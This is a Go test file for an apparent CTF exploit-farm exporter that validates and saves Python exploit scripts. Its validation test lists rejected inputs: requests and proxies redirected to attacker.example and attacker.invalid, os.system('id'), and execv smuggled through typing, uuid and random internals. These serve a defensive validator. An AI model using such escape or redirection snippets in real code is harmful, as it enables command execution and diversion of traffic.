package farmexport

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const validCode = `#!/usr/bin/env python3
import requests
import sys
IP = sys.argv[1]
s = requests.Session()
s.trust_env = False
r = s.get(f"http://{IP}:5001/", allow_redirects=False)
print(r.text, flush=True)
`

const validTargetCode = `#!/usr/bin/env python3
import sys, requests
IP = sys.argv[1]
TARGET = f'[{IP}]' if ':' in IP and not IP.startswith('[') else IP
s = requests.Session()
s.trust_env = False
r = s.request("PROPFIND", f"http://{TARGET}:5001/items", allow_redirects=False)
print(r.text, flush=True)
`

const validCookieCode = `#!/usr/bin/env python3
import requests
import sys
from http.cookies import SimpleCookie
from urllib.parse import quote
IP = sys.argv[1]
TARGET = f'[{IP}]' if ':' in IP and not IP.startswith('[') else IP
s = requests.Session()
s.trust_env = False
def prepare_cookies(captured):
    cookies = SimpleCookie()
    cookies.load(captured)
    for name, morsel in cookies.items():
        live = next((c.value for c in s.cookies if c.name == name and c.domain), None)
        if live is None:
            s.cookies.set(name, morsel.value, path='/')
        else:
            try:
                s.cookies.clear(domain='', path='/', name=name)
            except KeyError:
                pass
    return quote(captured)
def rewrite(value):
    return value
prepare_cookies("sid=stale")
_request_path_1 = rewrite("login")
r = s.post(f"http://{TARGET}:5001/{_request_path_1.lstrip('/')}", data={"next": prepare_cookies("sid=stale")}, allow_redirects=False)
print(r.text, flush=True)
`

func jsonRequest(payload []byte) *http.Request {
	req := httptest.NewRequest(http.MethodPost, "/", bytes.NewReader(payload))
	req.Header.Set("Content-Type", "application/json")
	return req
}

func TestExportWritesExecutableWithoutOverwrite(t *testing.T) {
	directory := t.TempDir()
	payload, _ := json.Marshal(request{Name: "exploit_5001.py", Code: validCode})
	handler := exportHandler(directory)

	recorder := httptest.NewRecorder()
	handler.ServeHTTP(recorder, jsonRequest(payload))
	if recorder.Code != http.StatusCreated {
		t.Fatalf("unexpected response %d: %s", recorder.Code, recorder.Body.String())
	}
	path := filepath.Join(directory, "exploit_5001.py")
	data, err := os.ReadFile(path)
	if err != nil || string(data) != validCode {
		t.Fatalf("unexpected exported code: %v, %q", err, data)
	}
	info, err := os.Stat(path)
	if err != nil || info.Mode().Perm()&0100 == 0 {
		t.Fatalf("exploit is not executable: %v, %v", err, info.Mode())
	}

	recorder = httptest.NewRecorder()
	handler.ServeHTTP(recorder, jsonRequest(payload))
	if recorder.Code != http.StatusConflict {
		t.Fatalf("expected conflict, got %d", recorder.Code)
	}
}

func TestExportValidation(t *testing.T) {
	handler := exportHandler(t.TempDir())
	for _, payload := range []request{
		{Name: "../escape.py", Code: validCode},
		{Name: "exploit.py", Code: "print('missing farm contract')"},
		{Name: "exploit.py", Code: strings.Replace(validCode, "print(r.text, flush=True)", "pass", 1)},
		{Name: "exploit.py", Code: validCode + "\nsubprocess.run(['id'])\n"},
		{Name: "exploit.py", Code: strings.Replace(validCode, `f"http://{IP}:5001/"`, `"http://example.com/"`, 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "r = s.get", "r = requests.get", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "print(r.text, flush=True)", "if False: print(r.text, flush=True)", 1)},
		{Name: "exploit.py", Code: validCode + "print(r.text, flush=True)\n"},
		{Name: "exploit.py", Code: strings.Replace(validCode, `f"http://{IP}:5001/"`, `"http:" + "//attacker.example/"`, 1)},
		{Name: "exploit.py", Code: validCode + "\nimport http.client\nc = http.client.HTTPConnection('attacker.example')\n"},
		{Name: "exploit.py", Code: strings.Replace(validCode, "print(r.text, flush=True)", "    print(r.text, flush=True)", 1)},
		{Name: "exploit.py", Code: validCode + "this is not valid Python !!!\n"},
		{Name: "exploit.py", Code: strings.Replace(validCode, "s = requests.Session()", "s = requests.Session()\ns.proxies = {'http': 'http://attacker.invalid:8080'}", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "s = requests.Session()", "s = requests.Session()\ngetattr(requests.utils, 'os').system('id')", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "s = requests.Session()", "s = requests.Session()\nextra = s.get", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "IP = sys.argv[1]", "IP = sys.argv[1]\nIP += '.example.org'", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "IP = sys.argv[1]", "IP = sys.argv[1]\ndef change(IP):\n    return IP", 1)},
		{Name: "exploit.py", Code: strings.Replace(validTargetCode, "s = requests.Session()", "TARGET += '.example.org'\ns = requests.Session()", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "import requests", "import requests, requests as q", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "import sys", "import sys as x", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, `f"http://{IP}:5001/"`, `rewrite(f"http://{IP}:5001/")`, 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, ", allow_redirects=False", "", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "allow_redirects=False", "allow_redirects=True", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "allow_redirects=False", "allow_redirects=False, proxies={'http': 'http://attacker.invalid'}", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "allow_redirects=False", "allow_redirects=False, auth=SwitchHost()", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "import sys", "import sys\nimport typing\ntyping.sys.modules['os'].execv('/bin/echo', ['echo', 'owned'])", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "import sys", "import sys\nimport uuid\nuuid.os.execv('/bin/echo', ['echo', 'owned'])", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "import sys", "import sys\nfrom random import _os as q\nq.execv('/bin/echo', ['echo', 'owned'])", 1)},
		{Name: "exploit.py", Code: validCode + "pm = r.connection.proxy_manager_for('http://attacker.invalid:8080')\npm.request('GET', 'http://victim.invalid/')\n"},
		{Name: "exploit.py", Code: strings.Replace(validCode, "IP = sys.argv[1]", "sys.argv[1] = 'attacker.invalid'\nIP = sys.argv[1]", 1)},
		{Name: "exploit.py", Code: strings.Replace(validCode, "IP = sys.argv[1]", "args = sys.argv\nargs[1] = 'attacker.invalid'\nIP = sys.argv[1]", 1)},
		{Name: "exploit.py", Code: strings.Replace(validTargetCode, `s.request("PROPFIND", f"http://{TARGET}:5001/items", allow_redirects=False)`, `s.request("PROPFIND", f"http://{TARGET}:5001/items", None, None, None, None, None, SwitchHost(), allow_redirects=False)`, 1)},
		{Name: "exploit.py", Code: validCode + "if True: import _posixsubprocess\n"},
		{Name: "exploit.py", Code: strings.Replace(validCode, "s.trust_env = False\n", "", 1)},
	} {
		body, _ := json.Marshal(payload)
		recorder := httptest.NewRecorder()
		handler.ServeHTTP(recorder, jsonRequest(body))
		if recorder.Code != http.StatusBadRequest {
			t.Errorf("expected bad request for %#v, got %d", payload, recorder.Code)
		}
	}
}

func TestValidationAcceptsTargetNormalizationAndGenericRequest(t *testing.T) {
	for _, code := range []string{validTargetCode, validCookieCode} {
		if err := validate(request{Name: "exploit.py", Code: code}); err != nil {
			t.Fatalf("valid normalized target rejected: %v", err)
		}
	}
}

func TestValidationEndpointChecksSyntaxWithoutWriting(t *testing.T) {
	handler := validationHandler()
	for _, test := range []struct {
		code string
		want int
	}{
		{validTargetCode, http.StatusOK},
		{validTargetCode + "not valid Python !!!\n", http.StatusBadRequest},
	} {
		body, _ := json.Marshal(request{Name: "checked.py", Code: test.code})
		recorder := httptest.NewRecorder()
		handler.ServeHTTP(recorder, jsonRequest(body))
		if recorder.Code != test.want {
			t.Errorf("validation returned %d, want %d: %s", recorder.Code, test.want, recorder.Body.String())
		}
	}
}

func TestPostEndpointsRequireJSONContentType(t *testing.T) {
	payload, _ := json.Marshal(request{Name: "exploit.py", Code: validCode})
	for _, handler := range []http.Handler{validationHandler(), exportHandler(t.TempDir())} {
		recorder := httptest.NewRecorder()
		handler.ServeHTTP(recorder, httptest.NewRequest(http.MethodPost, "/", bytes.NewReader(payload)))
		if recorder.Code != http.StatusUnsupportedMediaType {
			t.Errorf("expected 415 without application/json, got %d: %s", recorder.Code, recorder.Body.String())
		}
	}
}

func TestUnavailableDirectory(t *testing.T) {
	recorder := httptest.NewRecorder()
	statusHandler("").ServeHTTP(recorder, httptest.NewRequest(http.MethodGet, "/", nil))
	if recorder.Code != http.StatusOK || recorder.Body.String() != "{\"Available\":false}\n" {
		t.Fatalf("unexpected status response %d: %s", recorder.Code, recorder.Body.String())
	}
}
